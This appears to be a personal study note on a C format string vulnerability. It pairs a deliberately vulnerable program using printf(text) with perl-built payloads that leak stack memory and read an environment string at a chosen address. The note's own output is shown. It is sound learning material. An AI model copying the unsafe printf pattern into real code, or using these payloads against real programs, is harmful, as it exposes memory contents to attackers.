Let’s take this code for example:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char text[1024];
    static int test_val = -72;
    if(argc < 2) {
        printf("Usage: %s <text to print>\n", argv[0]);
        exit(0);
    }

    strcpy(text, argv[1]);
    printf("The right way to print user-controlled input:\n");
    printf("%s", text);
    printf("\nThe wrong way to print user-controlled input:\n");
    printf(text);
    printf("\n");
    
    // Debug output
    printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, test_val);
    exit(0);
}
```

Seems harmless right? `printf(text)`, seems to work fine if we input a simple string. BUT YOU ARE WRONG, this code is actually evil! 😈

If you input a format string, you can see why. Let’s try `%s`:

```
The right way to print user-controlled input:
test%s
The wrong way to print user-controlled input:
[1]    87679 segmentation fault (core dumped)  ./fmt_vuln test%s
```

Well that was expected, there is no guarantee what the next thing in memory is, is a string. What about `%x` then?

```
The right way to print user-controlled input:
test%x
The wrong way to print user-controlled input:
test74736574
[*] test_val @ 0x56559020 = -72 0xffffffb8
```

OH! That does look like an address to me. Let’s try to combine it with perl to examine the memory.

```bash
❯ ./fmt_vuln `perl -e 'print "%08x."x40'`
The right way to print user-controlled input:
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
The wrong way to print user-controlled input:
78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.
[*] test_val @ 0x56559020 = -72 0xffffffb8
```

We can see the bytes `25, 30, 38, 78, 2e` repeating a lot, this is because they can be translated to `%08x.`, the string we were spamming. So, let’s try exploiting.

```bash
❯ ./fmt_vuln `perl -e 'print "A"x4 . "%08x."x4'`    
The right way to print user-controlled input:
AAAA%08x.%08x.%08x.%08x.
The wrong way to print user-controlled input:
AAAA41414141.78383025.3830252e.30252e78.
[*] test_val @ 0x56559020 = -72 0xffffffb8
```

Here in the output, we can see that there is `41414141`, that stands for `AAAA`, meaning right from the start, the first format string starts to read it’s data. If we replace the `%08x.` with `%s`, then it would cause a __segfault__, since since there really isn’t anything at that address. 

Let’s try replacing it with a new address. Let’s use the tool from [[Using ENV for binexp]].

Let’s use `$path` as an example.

```bash
❯ ./get_exact_env.o ./fmt_vuln PATH
PATH will be at 0xffffcea0
```

Using this address we can do our best to read it and it worked!
```bash
./fmt_vuln `perl -e 'print "\xa0\xce\xff\xff" . "%s"'`
The right way to print user-controlled input:
%s
The wrong way to print user-controlled input:
/home/soda/scripts/:/home/soda/.npm-packages/bin:/home/soda/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/bin:/opt/android-sdk/cmdline-tools/latest/bin:/opt/android-sdk/platform-tools:/opt/android-sdk/tools:/opt/android-sdk/tools/bin:/opt/cuda/bin:/opt/cuda/nsight_compute:/opt/cuda/nsight_systems/bin:/home/soda/.dotnet/tools:/var/lib/flatpak/exports/bin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl
[*] test_val @ 0x56559020 = -72 0xffffffb8
```

```ad-note
Note to self: If it's not working look at your perl script, you always mess it up. 🙄
```


Now, let’s try writing to a memory address [[Format string write]]